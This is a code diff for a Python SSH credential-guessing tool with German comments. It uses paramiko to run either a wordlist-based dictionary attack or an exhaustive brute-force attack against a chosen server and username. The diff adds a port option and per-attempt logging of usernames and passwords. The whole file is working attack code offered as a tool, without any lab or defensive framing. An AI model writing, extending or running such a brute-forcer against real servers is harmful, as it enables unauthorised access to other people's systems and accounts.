@@ -3,12 +3,13 @@ import paramiko
 import itertools
 import string
 
-def ssh_connect(username, server, password):
+def ssh_connect(username, server, password, port=22):  # Defaultport ist 22
     """Versucht, sich per SSH mit den gegebenen Zugangsdaten zu verbinden."""
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    print(f'try username {username} and password {password}')
     try:
-        client.connect(server, username=username, password=password, timeout=5)
+        client.connect(server, username=username, password=password, port=port, timeout=5)
         print(f"[+] Erfolgreich angemeldet: {username}@{server} mit Passwort: {password}")
         client.close()
         return True
@@ -18,23 +19,23 @@ def ssh_connect(username, server, password):
         print(f"[!] Fehler: {e}")
         return False
 
-def dictionary_attack(username, server, wordlist):
+def dictionary_attack(username, server, wordlist, port):
     """Führt einen Dictionary-Angriff mit einer gegebenen Wordlist durch."""
     try:
         with open(wordlist, "r") as file:
             for password in file:
                 password = password.strip()
-                if ssh_connect(username, server, password):
+                if ssh_connect(username, server, password, port):
                     return
     except FileNotFoundError:
         print("[!] Wordlist-Datei nicht gefunden.")
 
-def brute_force_attack(username, server, min_len, max_len, charset):
+def brute_force_attack(username, server, min_len, max_len, charset, port):
     """Führt eine Brute-Force-Attacke mit generierten Passwörtern durch."""
     for length in range(min_len, max_len + 1):
         for password in itertools.product(charset, repeat=length):
             password = "".join(password)
-            if ssh_connect(username, server, password):
+            if ssh_connect(username, server, password, port):
                 return
 
 def main():
@@ -45,12 +46,13 @@ def main():
     parser.add_argument('--min', type=int, default=4, help='Minimale Passwortlänge für Brute Force')
     parser.add_argument('--max', type=int, default=6, help='Maximale Passwortlänge für Brute Force')
     parser.add_argument('-c', '--charset', default=string.ascii_lowercase + string.digits, help='Zeichensatz für Brute Force')
+    parser.add_argument('--port', type=int, default=22, help='Port für SSH-Verbindung (default: 22)')
     args = parser.parse_args()
 
     if args.wordlist:
-        dictionary_attack(args.username, args.server, args.wordlist)
+        dictionary_attack(args.username, args.server, args.wordlist, args.port)
     else:
-        brute_force_attack(args.username, args.server, args.min, args.max, args.charset)
+        brute_force_attack(args.username, args.server, args.min, args.max, args.charset, args.port)
 
 if __name__ == "__main__":
     main()
